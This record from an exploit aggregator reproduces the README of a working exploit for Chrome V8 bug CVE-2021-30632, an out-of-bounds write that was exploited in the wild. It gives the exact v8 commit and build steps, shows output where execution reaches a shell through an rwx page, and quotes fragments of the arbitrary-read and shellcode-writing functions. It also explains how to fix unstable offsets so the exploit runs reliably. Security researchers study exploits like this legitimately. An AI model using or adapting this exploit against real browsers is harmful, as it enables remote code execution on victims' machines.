[
  {
    "source": "## https://sploitus.com/exploit?id=F93398C9-9FB8-5521-AA24-060B3C7D53E0\nFrom: https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE-2021-30632\n\n\n\nThe analysis of this bug can be found here. This is a Chrome bug that is reported by an anonymous researcher and was believed to be exploited in the wild.\n\nThe exploit here is tested on v8 version 9.3.345.16 (commit 632e6e7), which is the version shipped with Chrome 93.0.4577.63, the one before the bug is fixed, on Ubuntu 20.04. I have not tested it on Chrome itself.\n\nTo test, check out v8 at commit 632e6e7 and compile with the default settings using tools/dev/gm.py x64.release. Then open the file poc.js with d8:\n\n./d8 poc.js\nOn Ubuntu 20.04, it should call execve(\"/bin/sh\") to spawn a new process:\n\n./d8 poc.js\ninstance: 81d42dd\nelements: 804abd9\nrwx page address: 22c70c88b000\nintArray addr: 8105d79\nintBackingStore: 56498ceb25e0\n$\nShell code may need changing on other platforms.\n\nThe exploit is very reliable, however, when testing, I noticed that some offsets appear to be sensitive to small changes in the file (even adding comments may cause problem), which would cause the exploit to fail. This only happens when the file is modified and usually manifests itself with some garbage values of the addresses, for example:\n\ninstance: 81d42dd\nelements: 800222d\nrwx page address: 3ff199999999999a\nintArray addr: 81067e1\nintBackingStore: 3ff199999999999a\nIn the above, address of rwx page and initBackingStore are clearly incorrect. The root cause seems to be an incorrect elements store value. (800222d is not a valid value) This can usually be fixed by changing the following lines regarding the address of elements:\n\nfunction arbRead(addr) {\n  [elements, addr1] = ftoi32(addrs[1]);  //<---- change this to [addr1, elements] = ftoi32(addrs[1]);\n  oobWrite(i32tof(addr,addr1));          //<---- change to   oobWrite(i32tof(addr1,addr));\n  return writeArr[0];\n}\n...\nfunction writeShellCode(rwxAddr, shellArr) {\n  var intArr = new Uint8Array(400);\n  var intArrAddr = addrOf(intArr);\n  console.log(\"intArray addr: \" + intArrAddr.toString(16));\n  var intBackingStore = ftoi(arbRead(intArrAddr + 0x20));\n  console.log(\"intBackingStore: \" + ftoi(arbRead(intArrAddr + 0x20)).toString(16));\n\n  [elements, addr1] = ftoi32(addrs[1]);              //<------ change this to [addr1, elements] = ftoi32(addrs[1]);\n  oobWrite(i32tof(intArrAddr + 0x20, addr1));        //<------ change this to oobWrite(i32tof(addr1, intArrAddr + 0x20));\n  ...\n}\n...\nvar elementsAddr = ftoi32(addrs[1])[0];             //<------- change this to var elementsAddr = ftoi32(addrs[1])[1];\nThis, however, does not affect the reliability of the exploit as the offsets are stable as long as the file is fixed, but it may cause issues if the poc is modified. I do not know what causes this, but the exploit can probably be made more robust against this by matching patterns in memory instead of relying on fixed offsets.",
    "id": "F93398C9-9FB8-5521-AA24-060B3C7D53E0",
    "href": "https://github.com/paulsery/CVE-2021-30632",
    "title": "Exploit for Out-of-bounds Write in Google Chrome"
  }
]
